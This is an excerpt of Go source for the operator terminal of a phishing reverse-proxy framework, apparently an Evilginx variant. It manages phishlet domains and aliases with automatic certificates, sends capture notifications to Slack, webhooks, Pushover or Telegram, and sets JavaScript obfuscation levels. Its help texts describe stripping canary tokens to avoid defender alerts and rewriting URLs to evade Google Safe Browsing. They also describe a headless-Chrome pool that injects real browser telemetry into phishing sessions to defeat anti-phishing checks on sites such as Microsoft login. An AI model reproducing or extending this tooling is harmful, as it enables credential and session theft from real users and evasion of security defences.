...
func (t *Terminal) SetPuppet(puppet *EvilPuppet) {
	t.puppet = puppet
}

func (t *Terminal) SetNotifier(n *Notifier) {
	t.notifier = n
}

func (t *Terminal) SetCanaryStripper(cs *CanaryStripper) {
	t.canary = cs
}

func (t *Terminal) SetURLRewriter(rw *URLRewriter) {
	t.rewriter = rw
}

func (t *Terminal) SetJA4(ja4 *JA4Fingerprinter) {
	t.ja4 = ja4
}
...
func (t *Terminal) DoWork() {
	...
	for !do_quit {
		...
		case "domains":
			cmd_ok = true
			log.Info("base domain: %s", t.cfg.GetBaseDomain())
			log.Info("server IP:   %s", t.cfg.GetServerIP())
			log.Info("--- per-phishlet domains ---")
			for site, pl := range t.cfg.phishlets {
				dom, ok := t.cfg.GetSiteDomain(pl.Name)
				if ok && dom != "" {
					enabled := "disabled"
					if t.cfg.IsSiteEnabled(site) {
						enabled = "enabled"
					}
					log.Info("  %-12s → %s (%s)", pl.Name, dom, enabled)
					aliases := t.cfg.GetSiteAliases(pl.Name)
					for _, a := range aliases {
						log.Info("  %-12s   + alias: %s", "", a)
					}
				}
			}
		case "alias":
			cmd_ok = true
			if len(args) < 3 {
				log.Info("usage: alias add <phishlet> <domain>")
				log.Info("       alias remove <phishlet> <domain>")
				log.Info("       alias list <phishlet>")
			} else if args[1] == "add" && len(args) >= 4 {
				_, err := t.cfg.GetPhishlet(args[2])
				if err != nil {
					log.Error("%v", err)
				} else {
					t.cfg.AddSiteAlias(args[2], args[3])
					t.cfg.refreshActiveHostnames()
					// Request certs for alias domain hosts
					aliasHosts := t.cfg.GetAllAliasHosts(args[2])
					for _, h := range aliasHosts {
						log.Info("requesting cert for alias host: %s", h)
						err := t.updateHostCertificate(h)
						if err != nil {
							log.Error("cert for %s: %v", h, err)
						}
					}
				}
			} else if args[1] == "remove" && len(args) >= 4 {
				t.cfg.RemoveSiteAlias(args[2], args[3])
				t.cfg.refreshActiveHostnames()
			} else if args[1] == "list" {
				aliases := t.cfg.GetSiteAliases(args[2])
				if len(aliases) == 0 {
					log.Info("no aliases for phishlet '%s'", args[2])
				} else {
					for _, a := range aliases {
						log.Info("  %s", a)
					}
		...
		case "obfuscation":
			...
			if len(args) < 2 {
				...
				t.cfg.SetObfuscationLevel(args[1])
			}
		case "canary":
			cmd_ok = true
			if len(args) < 2 {
				if t.canary != nil {
					en := "disabled"
					if t.canary.IsEnabled() {
						en = "enabled"
					}
					log.Info("canary stripping: %s (domains: %d)", en, len(t.canary.GetDomains()))
				}
			} else if args[1] == "enable" {
				t.cfg.SetCanaryStrip(true)
				if t.canary != nil {
					t.canary.SetEnabled(true)
				}
			} else if args[1] == "disable" {
				t.cfg.SetCanaryStrip(false)
				if t.canary != nil {
					t.canary.SetEnabled(false)
				}
			} else if args[1] == "add" && len(args) >= 3 {
				if t.canary != nil {
					t.canary.AddDomain(args[2])
					log.Info("canary domain added: %s", args[2])
				}
			} else if args[1] == "list" {
				if t.canary != nil {
					for _, d := range t.canary.GetDomains() {
						log.Info("  %s", d)
					}
				}
			}
		case "notify":
			...
			if len(args) < 2 {
				if t.notifier != nil {
					log.Info("notifications: %s", t.notifier.GetStatus())
				}
			} else if args[1] == "slack" && len(args) >= 3 {
				t.cfg.SetNotifySlackURL(args[2])
				if t.notifier != nil {
					t.notifier.SetSlackWebhook(args[2])
				}
			} else if args[1] == "webhook" && len(args) >= 3 {
				t.cfg.SetNotifyWebhookURL(args[2])
				if t.notifier != nil {
					t.notifier.SetWebhookURL(args[2])
				}
			} else if args[1] == "pushover" && len(args) >= 4 {
				t.cfg.SetNotifyPushover(args[2], args[3])
				if t.notifier != nil {
					t.notifier.SetPushover(args[2], args[3])
				}
			} else if args[1] == "test" {
				if t.notifier != nil {
					t.notifier.NotifyEvent(EventLureClicked, map[string]string{"test": "true", "source": "terminal"})
		...
		case "ja4":
			...
			if len(args) < 2 {
				if t.ja4 != nil {
					log.Info("ja4: %s", t.ja4.GetStatus())
				}
			} else if args[1] == "block" && len(args) >= 3 {
				if t.ja4 != nil {
					t.ja4.AddToBlocklist(args[2])
				}
			} else if args[1] == "auto" {
				if len(args) >= 3 && args[2] == "off" {
					if t.ja4 != nil {
						t.ja4.SetAutoBlock(false)
						log.Info("ja4: auto-blocking disabled")
					}
				} else {
					if t.ja4 != nil {
						t.ja4.SetAutoBlock(true)
		...
		case "rewrite":
			...
			if len(args) < 2 {
				if t.rewriter != nil {
					log.Info("URL rewriting: %s", t.rewriter.GetStatus())
				}
			} else if args[1] == "enable" {
				t.cfg.SetURLRewrite(true)
				if t.rewriter != nil {
					t.rewriter.SetEnabled(true)
				}
			} else if args[1] == "disable" {
				t.cfg.SetURLRewrite(false)
				if t.rewriter != nil {
					t.rewriter.SetEnabled(false)
				}
			} else if args[1] == "list" {
				if t.rewriter != nil {
					for _, r := range t.rewriter.GetRules() {
						log.Info("  %s → %s (strip: %v)", r.MatchPath, r.RewriteTo, r.StripParams)
					}
				}
			} else if args[1] == "add" && len(args) >= 4 {
				if t.rewriter != nil {
					t.rewriter.AddRule(args[2], args[3], nil)
				}
			} else if args[1] == "clear" {
				if t.rewriter != nil {
					t.rewriter.ClearRules()
...
func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		keys := []string{"domain", "ip", "redirect_key", "verification_key", "verification_token", "redirect_url", "adminpage_path", "turnstile_sitekey", "turnstile_privkey", "recaptcha_sitekey", "recaptcha_privkey", "telegram_token", "telegram_chatid"}
		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl, t.cfg.adminpage_path, t.cfg.turnstile_sitekey, t.cfg.turnstile_privkey, t.cfg.recaptcha_sitekey, t.cfg.recaptcha_privkey, t.cfg.telegram_token, t.cfg.telegram_chatid}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		...
		case "recaptcha_privkey":
			...
			return nil
		case "telegram_token":
			t.cfg.SetTelegramToken(args[1])
			return nil
		case "telegram_chatid":
			t.cfg.SetTelegramChatID(args[1])
			return nil
		}
	}
...
func (t *Terminal) handleAversions(args []string) error {
	...
	if pn == 0 {
		...
		case "killbot_key":
			if pn < 2 {
				return fmt.Errorf("usage: aversions killbot_key <api_key>")
			}
		...
		case "antibotpw_key":
			if pn < 2 {
				return fmt.Errorf("usage: aversions antibotpw_key <api_key>")
			}
			t.cfg.SetAntiBotPwApikey(args[1])
		default:
			return fmt.Errorf("unknown aversion: %s", args[0])
		}
		return nil
	}
	return fmt.Errorf("invalid syntax: %s", args)
...
func (t *Terminal) handlePuppet(args []string) error {
	...
	if pn == 0 {
		// Show status
		if t.puppet != nil {
			log.Info("evilpuppet: %s", t.puppet.GetStatus())
		} else {
			log.Info("evilpuppet: not initialized")
		}
		return nil
	}
	switch args[0] {
	case "enable":
		t.cfg.SetPuppetEnabled(true)
		if t.puppet != nil {
			t.puppet.SetEnabled(true)
			t.puppet.SetPoolSize(t.cfg.GetPuppetPoolSize())
			t.puppet.SetRefreshMins(t.cfg.GetPuppetRefreshMins())
			if err := t.puppet.Start(); err != nil {
				log.Error("puppet start: %v", err)
			}
		}
	case "disable":
		t.cfg.SetPuppetEnabled(false)
		if t.puppet != nil {
			t.puppet.SetEnabled(false)
			t.puppet.Stop()
		}
	case "status":
		if t.puppet != nil {
	...
	case "pool":
		if pn < 2 {
			return fmt.Errorf("usage: puppet pool <size>")
		}
		size, err := strconv.Atoi(args[1])
		if err != nil {
			return fmt.Errorf("invalid pool size: %s", args[1])
		}
		t.cfg.SetPuppetPoolSize(size)
		if t.puppet != nil {
			t.puppet.SetPoolSize(size)
		}
	case "refresh":
		if pn < 2 {
			return fmt.Errorf("usage: puppet refresh <minutes>")
		}
		mins, err := strconv.Atoi(args[1])
		if err != nil {
			return fmt.Errorf("invalid refresh interval: %s", args[1])
		}
		t.cfg.SetPuppetRefreshMins(mins)
		if t.puppet != nil {
			t.puppet.SetRefreshMins(mins)
		}
	case "collect":
		if pn < 2 {
			return fmt.Errorf("usage: puppet collect <url>")
		}
		if t.puppet == nil || !t.puppet.IsEnabled() {
			return fmt.Errorf("puppet is not enabled — run 'puppet enable' first")
		}
		targetURL := args[1]
		log.Info("collecting telemetry from: %s ...", targetURL)
		tel, err := t.puppet.GetTelemetry(targetURL)
		if err != nil {
			return fmt.Errorf("collection failed: %v", err)
		}
		log.Success("telemetry collected:")
		log.Info("  canvas_hash:    %s", tel.CanvasHash)
		log.Info("  webgl_vendor:   %s", tel.WebGLVendor)
		log.Info("  webgl_renderer: %s", tel.WebGLRenderer)
		log.Info("  user_agent:     %s", tel.UserAgent)
		log.Info("  platform:       %s", tel.Platform)
		log.Info("  screen:         %dx%d @%dx", tel.ScreenWidth, tel.ScreenHeight, int(tel.PixelRatio))
		log.Info("  hw_concurrency: %d", tel.HardwareConcurrency)
		log.Info("  device_memory:  %d GB", tel.DeviceMemory)
		log.Info("  plugins:        %d", tel.PluginCount)
	case "clear":
		if t.puppet != nil {
			t.puppet.ClearCache()
		}
	default:
		return fmt.Errorf("unknown puppet command: %s", args[0])
	}
	return nil
}
...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ip"), readline.PcItem("redirect_key"), readline.PcItem("verification_key"), readline.PcItem("verification_token"), readline.PcItem("redirect_url"), readline.PcItem("turnstile_sitekey"), readline.PcItem("turnstile_privkey"), readline.PcItem("adminpage_path")))
	...
	h.AddCommand("obfuscation", "general", "set javascript obfuscation level", "Controls intensity of JS code obfuscation: off, low, medium, high, ultra.", LAYER_TOP,
		readline.PcItem("obfuscation", readline.PcItem("off"), readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high"), readline.PcItem("ultra")))
	h.AddSubCommand("obfuscation", nil, "", "show current obfuscation level")
	h.AddSubCommand("obfuscation", []string{"off"}, "off", "disable JS obfuscation")
	h.AddSubCommand("obfuscation", []string{"low"}, "low", "variable renaming only")
	h.AddSubCommand("obfuscation", []string{"medium"}, "medium", "rename vars + encode strings (default)")
	h.AddSubCommand("obfuscation", []string{"high"}, "high", "medium + dead code + IIFE wrapper")
	h.AddSubCommand("obfuscation", []string{"ultra"}, "ultra", "high + charCode splitting + control flow flattening")

	h.AddCommand("canary", "general", "manage canary token stripping", "Strip CSS/HTML canary tokens from proxied responses to prevent defender alerts.", LAYER_TOP,
		readline.PcItem("canary", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("add"), readline.PcItem("list")))
	h.AddSubCommand("canary", nil, "", "show canary stripping status")
	h.AddSubCommand("canary", []string{"enable"}, "enable", "enable canary token stripping")
	h.AddSubCommand("canary", []string{"disable"}, "disable", "disable canary token stripping")
	h.AddSubCommand("canary", []string{"add"}, "add <domain>", "add a canary domain to the strip list")
	h.AddSubCommand("canary", []string{"list"}, "list", "list all canary domains")

	h.AddCommand("notify", "general", "manage event notifications", "Configure Slack, webhook, and Pushover notifications for capture events.", LAYER_TOP,
		readline.PcItem("notify", readline.PcItem("slack"), readline.PcItem("webhook"), readline.PcItem("pushover"), readline.PcItem("test")))
	h.AddSubCommand("notify", nil, "", "show notification status")
	h.AddSubCommand("notify", []string{"slack"}, "slack <webhook_url>", "set Slack webhook URL")
	h.AddSubCommand("notify", []string{"webhook"}, "webhook <url>", "set generic webhook URL")
	h.AddSubCommand("notify", []string{"pushover"}, "pushover <user_key> <api_token>", "set Pushover credentials")
	h.AddSubCommand("notify", []string{"test"}, "test", "send a test notification to all channels")

	h.AddCommand("rewrite", "general", "manage URL path obfuscation", "Rewrite URL paths to evade Google Safe Browsing pattern detection.", LAYER_TOP,
		readline.PcItem("rewrite", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("clear")))
	h.AddSubCommand("rewrite", nil, "", "show URL rewriting status")
	h.AddSubCommand("rewrite", []string{"enable"}, "enable", "enable URL path rewriting")
	h.AddSubCommand("rewrite", []string{"disable"}, "disable", "disable URL path rewriting")
	h.AddSubCommand("rewrite", []string{"list"}, "list", "list current rewrite rules")
	h.AddSubCommand("rewrite", []string{"add"}, "add <match_path> <rewrite_to>", "add a rewrite rule")
	h.AddSubCommand("rewrite", []string{"clear"}, "clear", "remove all rewrite rules")

	h.AddCommand("ja4", "general", "manage JA4 TLS fingerprinting", "JA4 fingerprints every TLS connection, auto-blocks scanners that probe multiple paths rapidly, and logs all fingerprints to ja4_log.txt.", LAYER_TOP,
		readline.PcItem("ja4", readline.PcItem("block"), readline.PcItem("auto")))
	h.AddSubCommand("ja4", nil, "", "show JA4 fingerprinter status")
	h.AddSubCommand("ja4", []string{"block"}, "block <ja4_hash>", "manually block a JA4 fingerprint")
	h.AddSubCommand("ja4", []string{"auto"}, "auto [off]", "enable/disable auto-blocking of scanner behavior")

	h.AddCommand("puppet", "general", "manage evilpuppet browser telemetry engine", "Controls the headless Chrome browser pool that generates real browser telemetry for injection into phishing sessions to defeat anti-phishing checks.", LAYER_TOP,
		readline.PcItem("puppet", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("status"), readline.PcItem("pool"), readline.PcItem("refresh"), readline.PcItem("collect"), readline.PcItem("clear")))
	h.AddSubCommand("puppet", nil, "", "show evilpuppet status")
	h.AddSubCommand("puppet", []string{"enable"}, "enable", "enable evilpuppet browser telemetry injection")
	h.AddSubCommand("puppet", []string{"disable"}, "disable", "disable evilpuppet")
	h.AddSubCommand("puppet", []string{"status"}, "status", "show detailed puppet status")
	h.AddSubCommand("puppet", []string{"pool"}, "pool <size>", "set browser pool size (1-10)")
	h.AddSubCommand("puppet", []string{"refresh"}, "refresh <minutes>", "set telemetry refresh interval (min 5)")
	h.AddSubCommand("puppet", []string{"collect"}, "collect <url>", "manually collect telemetry from a URL (e.g. https://login.microsoftonline.com)")
	h.AddSubCommand("puppet", []string{"clear"}, "clear", "clear all cached telemetry")

	h.AddCommand("domains", "general", "list all domain assignments", "Shows the base domain, per-phishlet domains, and alias domains for multi-domain operations.", LAYER_TOP,
		readline.PcItem("domains"))

	h.AddCommand("alias", "general", "manage domain aliases for phishlets", "Add multiple domains to the same phishlet. Each alias gets its own TLS certs. Useful for running the same phishlet on different domains simultaneously.", LAYER_TOP,
		readline.PcItem("alias", readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("list")))
	h.AddSubCommand("alias", nil, "", "show alias usage")
	h.AddSubCommand("alias", []string{"add"}, "add <phishlet> <domain>", "add an alias domain to a phishlet")
	h.AddSubCommand("alias", []string{"remove"}, "remove <phishlet> <domain>", "remove an alias domain")
	h.AddSubCommand("alias", []string{"list"}, "list <phishlet>", "list all aliases for a phishlet")
